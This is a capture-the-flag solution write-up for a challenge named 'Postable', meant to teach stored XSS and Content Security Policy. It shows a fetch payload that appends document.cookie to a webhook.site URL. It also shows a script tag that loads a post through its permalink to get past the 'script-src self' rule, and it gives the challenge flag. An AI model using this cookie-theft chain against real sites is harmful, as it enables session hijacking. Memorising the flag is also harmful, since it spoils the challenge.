# Postable

## Purpose

Teach students about XSS and CSP.

## Solution

The site allows you to make text posts that get posted below the form on the
page.

NOTE: It is important that the competitor does not ignore any feature of the
site. The post submission form, permalink button, and report button all are
needed to solve the challenge.

A competitor should be able to quickly figure out that there is an stored XSS
vulnerability. Submitting something like `<h1>Hello</h1>` or such will have the
HTML rendered on the page. `<script>alert(1)</script>` will NOT produce a pop up
as it violates the CSP directive.

`Refused to execute inline script because it violates the following Content
Security Policy directive: "script-src 'self'".`

The competitor needs to understand that the `script-src 'self'` CSP directive
means that any JavaScript source must come from a file located on the same
host, but not at a different host and not as inline JavaScript. A "JavaScript
file" can be created on the host by making a post with only JavaScript code.
The JavaScript is just a fetch to a HTTP request inspector with the cookie
appended at the end.

```javascript
fetch("https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/" + document.cookie);
```

We can get the path to this file from the permalink button on the post. Then
running arbitrary JavaScript is as easy as making another post with

```html
<script src="/permalink?post=XXXXXXXXXXXXXXXXXXXXXXXX"></script>
```

and then issuing a report on that post to the admin via the Report button. The
report button will cause an "admin" to come and look at the post, causing their
cookies to be sent to us.

The flag will be appended to the request path the request inspector receives.

## Flag

`CTF{creative-people-solve-crazy-security-problems}`